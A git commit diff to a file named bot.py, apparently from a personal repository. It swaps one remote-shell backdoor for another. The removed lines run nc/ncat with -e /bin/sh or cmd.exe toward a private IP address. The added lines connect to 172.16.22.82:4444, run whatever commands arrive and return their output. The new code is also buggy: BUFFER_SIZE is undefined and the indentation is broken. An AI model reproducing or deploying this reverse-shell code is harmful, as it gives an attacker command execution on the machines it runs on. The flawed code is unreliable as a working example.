9b4e6a5e1241c70b24d3f73fdcee2c42d37379d4
Pol420OWO <118475266+Pol420OWO@users.noreply.github.com>
2023-02-14 20:40:38 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,19 +1,16 @@
-import platform
-import os
-import sysconfig
-import socket  
-def run():
-  hostname=socket.gethostname()   
-  IPAddr=socket.gethostbyname(hostname) 
-  iph='172.16.32.58'
-  print('# OS name: ', platform.system())
-  if "Linux" in platform.system():
-    print('Linux: ', sysconfig.get_platform()) 
-    print(' IpAddress: ', IPAddr)
-    #os.system( 'nc -lvp 734 -e /bin/sh')
-    os.system('nc' + iph+ ' 734 -e /bin/sh')
-  elif "Windows" in platform.system():
-    print('Windows: ', sysconfig.get_platform()) 
-    print('Address ip: ', IPAddr)
-    #os.system('ncat -lvp 734 -e cmd.exe')
-    os.system('ncat '+ iph +' 734 -e cmd.exe')
+import socket
+import subprocess
+SERVER_HOST = "172.16.22.82"
+SERVER_PORT = 4444
+
+s = socket.socket()
+s.connect((SERVER_HOST, SERVER_PORT))
+message = s.recv(BUFFER_SIZE).decode()
+print("Server:", message)
+while True:
+  command = s.recv(BUFFER_SIZE).decode()
+    if command.lower() == "exit":
+      break
+  output = subprocess.getoutput(command)
+  s.send(output.encode())
+s.close()
